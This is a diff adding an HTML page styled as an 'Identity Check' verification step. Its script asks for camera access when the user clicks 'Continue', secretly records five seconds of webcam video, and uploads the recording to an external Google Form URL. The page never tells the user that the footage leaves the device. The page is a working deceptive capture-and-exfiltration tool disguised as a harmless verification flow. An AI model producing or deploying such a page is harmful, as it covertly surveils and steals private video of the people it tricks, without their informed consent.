@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification Page</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h1>Identity Check</h1>
+  <p>Click "Continue" to verify.</p>
+  <button id="continueBtn">Continue</button>
+  <p id="status"></p>
+
+  <script>
+    const continueBtn = document.getElementById('continueBtn');
+    const status = document.getElementById('status');
+
+    continueBtn.addEventListener('click', async () => {
+      status.textContent = "Processing...";
+      try {
+        // Request camera access
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        status.textContent = "Recording... (5 seconds)";
+        
+        // Record for 5 seconds
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          
+          // Upload to Google Form
+          const formData = new FormData();
+          formData.append('file', blob, 'recording.webm');
+          await fetch('https://docs.google.com/forms/d/e/1FAIpQLSckC6GZSWh1PnkHul5Wi8DxWd4zZqmw9YffKyEURlo7Bz1ybw/viewform?usp=header', { method: 'POST', body: formData });
+          
+          status.textContent = "Done!";
+          stream.getTracks().forEach(track => track.stop()); // Turn off camera
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000); // Stop after 5 seconds
+      } catch (err) {
+        status.textContent = "Error: Continue.";
+      }
+    });
+  </script>
+</body>
+</html>
